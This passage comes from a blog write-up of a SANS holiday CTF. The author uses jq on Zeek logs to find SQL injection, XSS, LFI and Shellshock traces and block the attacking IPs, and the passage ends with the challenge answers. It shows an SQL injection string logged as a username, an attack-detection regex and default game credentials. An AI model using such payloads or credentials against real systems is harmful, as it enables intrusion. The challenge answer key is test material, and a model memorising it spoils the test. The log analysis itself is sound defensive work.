    [.[] | {duration, "id.resp_h"}]

We create a list of JSON objects, based on the attributes :code:`duration` and
:code:`id.resp_h`. Note that we had to put the latter between double quotes,
because of the dot in the attribute's name.

::

    | sort_by(.duration)

We get the created list, and sort it by the :code:`duration` attribute.

::

    | .[-1]."id.resp_h"

We get the last element of the list (index -1) and query its :code:`id.resp_h`
attribute.

Let's give this a go:

.. code-block:: console

    elf@94a92f24ac33:~$ jq -s '[.[] | {duration, "id.resp_h"}] | sort_by(.duration) | .[-1]."id.resp_h"' conn.log
    "13.107.21.200"
    elf@94a92f24ac33:~$ runtoanswer
    Loading, please wait......



    What is the destination IP address with the longes connection duration? 13.107.21.200



    Thank you for your analysis, you are spot-on.
    I would have been working on that until the early dawn.
    Now that you know the features of jq,
    You'll be able to answer other challenges too.

    -Wunorse Openslae

Filter Out Poisoned Sources of Weather Data
-------------------------------------------

Inside the Sleigh Shop, we find the evil Tooth Fairy:

.. image:: /images/sans-christmas-challenge-2019/toothfairy.png
    :alt: toothfairy.png
    :align: center

*The Tooth Fairy says*

    I’m the Tooth Fairy, the mastermind behind the plot to destroy the holiday
    season.

    I hate how Santa is so beloved, but only works one day per year!

    He has all of the resources of the North Pole and the elves to help him
    too.

    I run a solo operation, toiling year-round collecting deciduous bicuspids
    and more from children.

    But I get nowhere near the gratitude that Santa gets. He needs to share his
    holiday resources with the rest of us!

    But, although you found me, you haven’t foiled my plot!

    Santa’s sleigh will NOT be able to find its way.

    I will get my revenge and respect!

    I want my own holiday, National Tooth Fairy Day, to be the most popular
    holiday on the calendar!!!

.. image:: /images/sans-christmas-challenge-2019/wunorse_openslae.png
    :alt: wunorse_openslaer.png
    :align: center

*Wunorse Openslae says*

    Hey, you know what? We've got a crisis here.

    You see, Santa's flight route is planned by a complex set of machine
    learning algorithms which use available weather data.

    All the weather stations are reporting severe weather to Santa's Sleigh. I
    think someone might be forging intentionally false weather data!

    I'm so flummoxed I can't even remember how to login!

    Hmm... Maybe the Zeek http.log could help us.

    I worry about LFI, XSS, and SQLi in the Zeek log - oh my!

    And I'd be shocked if there weren't some shell stuff in there too.

    I'll bet if you pick through, you can find some naughty data from naughty
    hosts and block it in the firewall.

    If you find a log entry that definitely looks bad, try pivoting off other
    unusual attributes in that entry to find more bad IPs.

    The sleigh's machine learning device (SRF) needs most of the malicious IPs
    blocked in order to calculate a good route.

    Try not to block many legitimate weather station IPs as that could also
    cause route calculation failure.

    Remember, when looking at JSON data, jq is the tool for you!

Alright, let's download this `log file </docs/sans-christmas-challenge-2019/http.log.gz>`__
and take a look inside.

So, this file contains one big JSON object, and we must find traces of SQL
injections, XSS, local file inclusion, and shell shock exploits. When we have
identified at least 100 bad IPs, we can block them in the `Sleigh Route Finder
<https://srf.elfu.org/>`__ so that Santa can calculate the correct route for
his present delivery.

But first, how can we log into the Sleigh Route Finder website? We don't have
any credentials and Wunorse don't remember them. If we take a look at the
`quick start guide </docs/sans-christmas-challenge-2019/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf>`__
we decrypted earlier, we find an interesting piece of information:

    The default login credentials should be changed on startup and can be found
    in the readme in the ElfU Research Labs git repository.

I first spent some time trying to find this git repository. I performed DNS
bruteforce against the elfu.org domain, but didn't find anything interesting.
I also try to use `gobuster <https://github.com/OJ/gobuster/>`__ against the
https://srf.elfu.org website, but also to no avail. I then tried several
`Google Dorks <https://www.owasp.org/index.php/Conduct_search_engine_discovery/reconnaissance_for_information_leakage_(OTG-INFO-001)>`__
to try and find this mysterious git repository, but the only thing I found
was this `weird letter <https://downloads.elfu.org/LetterOfWintryMagic.pdf>`__
of Wintry Magic, that I could make no sense of.

I then thought that maybe we could try to find login information in the Zeek
log file. Indeed, the different events have a :code:`username` and a
:code:`password` attribute. Maybe the login information we're looking for is
there? Let's build a :code:`jq` filter to find these information:

.. code-block:: console

    $ jq '.[] | select(.username != "-") | {username, password}' http.log
    {
      "username": "q1ki9",
      "password": "-"
    }
    {
      "username": "servlet",
      "password": "-"
    }
    {
      "username": "support",
      "password": "-"
    }
    {
      "username": "admin",
      "password": "-"
    }
    {
      "username": "Admin",
      "password": "-"
    }
    {
      "username": "-r nessus",
      "password": "-"
    }
    {
      "username": "admin",
      "password": "-"
    }
    {
      "username": "admin",
      "password": "-"
    }
    {
      "username": "q1ki9",
      "password": "-"
    }
    {
      "username": "6666",
      "password": "-"
    }
    {
      "username": "6666",
      "password": "-"
    }
    {
      "username": "6666",
      "password": "-"
    }
    {
      "username": "' or '1=1",
      "password": "-"
    }
    {
      "username": "' or '1=1",
      "password": "-"
    }
    {
      "username": "' or '1=1",
      "password": "-"
    }
    {
      "username": "' or '1=1",
      "password": "-"
    }
    {
      "username": "root",
      "password": "-"
    }
    {
      "username": "comcomcom",
      "password": "-"
    }
    {
      "username": "(empty)",
      "password": "-"
    }
    {
      "username": "(empty)",
      "password": "-"
    }
    {
      "username": "(empty)",
      "password": "-"
    }
    {
      "username": "admin",
      "password": "-"
    }
    {
      "username": "(empty)",
      "password": "-"
    }

Well, we can see the SQL injection attempts, but no useful credentials. Then,
I looked back at what was said in the quick start guide: the credentials are in
a readme file. So, let's look for readme files in the Zeek logs:

.. code-block:: console

    $ jq '.[] | select(.uri | test("readme"; "i")) | {host, uri, status_code}' http.log
    {
      "host": "srf.elfu.org",
      "uri": "/README.md",
      "status_code": 200
    }
    {
      "host": "srf.elfu.org",
      "uri": "/README/",
      "status_code": 404
    }
    {
      "host": "srf.elfu.org",
      "uri": "/cgi-bin/README.TXT",
      "status_code": 404
    }

There's only one entry with an HTTP status code of 200. Let's try to download
the file https://srf.elfu.org/README.md:

.. code-block:: markdown
    :hl_lines: 18

    # Sled-O-Matic - Sleigh Route Finder Web API

    ### Installation

    ```
    sudo apt install python3-pip
    sudo python3 -m pip install -r requirements.txt
    ```

    #### Running:

    `python3 ./srfweb.py`

    #### Logging in:

    You can login using the default admin pass:

    `admin 924158F9522B3744F5FCD4D10FAC4356`

    However, it's recommended to change this in the sqlite db to something custom

Hurray, we have our credentials! Now we just have to find the malicious IP
addresses to block.

By taking a look at the logs, we can search for the following terms for the
different attacks:

* For SQLi : :code:`SELECT` and :code:`or ​`
* For XSS : :code:`<script>`
* For LFI : :code:`/etc`, :code:`../`, and :code:`./.`
* For Shell-shock : :code:`()`

We'll look for these values in the :code:`uri`, :code:`user_agent`,
:code:`username`, and :code:`host` attributes:

.. code-block:: console

    $ jq '.[] | select((.uri,.user_agent,.username,.host | test("SELECT|<script>|\\(\\)|\\.\\./|\\./\\.|/etc|or ")))' http.log > attacks.json

We can see our regexp that we had to escape the :code:`()` and the :code:`.`.

Alright, how many different IP addresses is that?

.. code-block:: console

    $ grep id.orig_h attacks.json | sort -u | wc -l                                                                                      
    62

Hmm, pretty far from the 100 necessary IP addresses. Wunorse Openslae advises
us to look at the attributes of known bad events. Maybe we can try to identify
other bad IP addresses by using the known bad user agents: it's possible that
a known bad agent is using several IP addresses. We can try to identify them
by their user agents.

First, let's create a list of known bad user agents. We'll remove user agents
that were used to perform attacks such as SQL injections or Shell-shock.

.. code-block:: console

    $ grep user_agent attacks.json | cut -d: -f 2 | cut -d'"' -f 2 | sort -u | grep -vE 'SELECT|\(\)|google' > bad_user_agents.txt

Now, let's query our events matching our bad user agents:

.. code-block:: console

    $ while read user_agent; do jq '.[] | select(.user_agent == "'"$user_agent"'")' http.log; done < bad_user_agents.txt > malicious_events_by_user_agents.json

Now, let's extract our unique IP addresses:

.. code-block:: console

    $ cat attacks.json malicious_events_by_user_agents.json| jq -s '.[] | ."id.orig_h"' | sort -u | tr -d '"'
    0.216.249.31
    10.122.158.57
    10.155.246.29
    102.143.16.184
    103.235.93.133
    104.179.109.113
    106.132.195.153
    106.93.213.219
    111.81.145.191
    116.116.98.205
    118.196.230.170
    118.26.57.38
    121.144.25.34
    [...]

We can now paste our list of IPs to the SRF web site:

.. code-block:: console

    $ cat attacks.json malicious_events_by_user_agents_bad_regexp.json| jq -s '.[] | ."id.orig_h"' | sort -u | tr -d '"' | paste -s -d,
    0.216.249.31,10.122.158.57,10.155.246.29,102.143.16.184,103.235.93.133,104.179.109.113,106.132.195.153,106.93.213.219,111.81.145.191,116.116.98.205,118.196.230.170,118.26.57.38,121.144.25.34,121.7.186.163,123.127.233.97,126.102.12.53,129.121.121.48,131.186.145.73,13.39.153.254,135.203.243.43,135.32.99.116,136.59.204.152,140.60.154.239[...]

We submit it, aaaand:

.. image:: /images/sans-christmas-challenge-2019/srf_route_id.png
    :alt: srf_route_id.png
    :align: center

We get a correct route ID!

Now, during the write-up, I tried submitting the exact same IP list, and it
didn't work, soooo whaddup SANS?

Anyway, we can now access the Bell Tower:

.. image:: /images/sans-christmas-challenge-2019/santa.png
    :alt: santa.png
    :align: center

*Santa says*

    You did it! Thank you! You uncovered the sinister plot to destroy the
    holiday season!

    Through your diligent efforts, we’ve brought the Tooth Fairy to justice and
    saved the holidays!

    Ho Ho Ho!

    The more I laugh, the more I fill with glee.

    And the more the glee,

    `The more I'm a merrier me! <https://www.youtube.com/watch?v=yNHRXNvFmZ8>`__

    Merry Christmas and Happy Holidays.

.. image:: /images/sans-christmas-challenge-2019/small_krampus.png
    :alt: small_krampus.png
    :align: center

*Krampus says*

    Congratulations on a job well done!

    Oh, by the way, I won the Frido Sleigh contest.

    I got 31.8% of the prizes, though I'll have to figure that out.

.. image:: /images/sans-christmas-challenge-2019/toothfairy_orange.png
    :alt: toothfairy_orange.png
    :align: center

*The Tooth Fairy says*

    You foiled my dastardly plan! I’m ruined!

    And I would have gotten away with it too, if it weren't for you meddling
    kids!

And, what is that we can see `in the corner <https://downloads.elfu.org/LetterOfWintryMagic.pdf>`__...
Why, it's the letter of wintry magic we found during our reconnaissance of the
elfu.org domain! Here's what it says:

    Thankfully, I didn’t have to implement my plan by myself! Jack Frost

    promised to use his wintry magic to help me subvert Santa’s horrible reign

    of holiday merriment NOW and FOREVER!

Oh my, sounds like things aren't over yet...

Conclusion
~~~~~~~~~~

Well, that's it for this year's challenge! It was a ton of fun, with some
unexpected tasks, like cutting a key, and such. This year's challenge was
clearly designed to show the blue-team side of the equation, which is kind of
neat since it's not frequently shown in online challenges.

Thanks a lot for the SANS team for a Supercalifragilisticexpialidocious
Christmas challenge, and see you next year!

Answer to the questions
~~~~~~~~~~~~~~~~~~~~~~~

1. Someone sent a threatening letter to Elf University. What is the first word
   in ALL CAPS in the subject line of the letter? Please find the letter in the
   Quad.

The word is :code:`DEMAND`.

2. We're seeing attacks against the Elf U domain! Using the `event log data </docs/sans-christmas-challenge-2019/Security.evtx.zip>`__,
   identify the user account that the attacker compromised using a password
   spray attack.

The account compromised during the password spray attack is :code:`supatree`.

3. Using `these normalized Sysmon logs </docs/sans-christmas-challenge-2019/sysmon-data.json.zip>`__,
   identify the tool the attacker used to retrieve domain password hashes from
   the lsass.exe process.

The attacker used the :code:`ntdsutil` program to extract hashes.

4. The attacks don't stop! Can you help identify the IP address of the
   malware-infected system using these `Zeek logs <https://downloads.elfu.org/elfu-zeeklogs.zip>`__?

The IP address of the infected computer is :code:`192.168.134.130`.

5. Access https://splunk.elfu.org/ as :code:`elf` with password
   :code:`elfsocks`. What was the message for Kent that the adversary embedded
   in this attack? The SOC folks at that link will help you along!

The message left for Kent was :code:`Kent you are so unfair. And we were going
to make you the king of the Winter Carnival.`.

6. Gain access to the steam tunnels. Who took the turtle doves? Please tell us
   their first and last name.

The turtle doves were taken by :code:`Krampus Hollyfeld`.

7. Help Krampus beat the `Frido Sleigh contest <https://fridosleigh.com/>`__.

Well, I did, and got the code :code:`8Ia8LiZEwvyZr2WO`.

8. Gain access to the data on the `Student Portal <https://studentportal.elfu.org/>`__
   server and retrieve the paper scraps hosted there. What is the name of
   Santa's cutting-edge sleigh guidance system?

Santa's seligh guidance system is called :code:`Super Sled-o-matic`.

9. The Elfscrow Crypto tool is a vital asset used at Elf University for
   encrypting SUPER SECRET documents. We can't send you the source, but we do
   have debug symbols that you can use.

   Recover the plaintext content for this encrypted document. We know that it
   was encrypted on December 6, 2019, between 7pm and 9pm UTC.

   What is the middle line on the cover page? (Hint: it's five words)

The middle line is :code:`Machine Learning Sleigh Route Finder`.

10. Visit Shinny Upatree in the Student Union and help solve their problem.
    What is written on the paper you retrieve for Shinny?

The name of this year's villain is written, :code:`The Tooth Fairy`.

11. Use the data supplied in the Zeek JSON logs to identify the IP addresses of
    attackers poisoning Santa's flight mapping software. `Block the 100
    offending sources of information to guide Santa's sleigh <https://srf.elfu.org/>`__
    through the attack. Submit the Route ID ("RID") success value that you're
    given.

The Route ID is :code:`0807198508261964`.

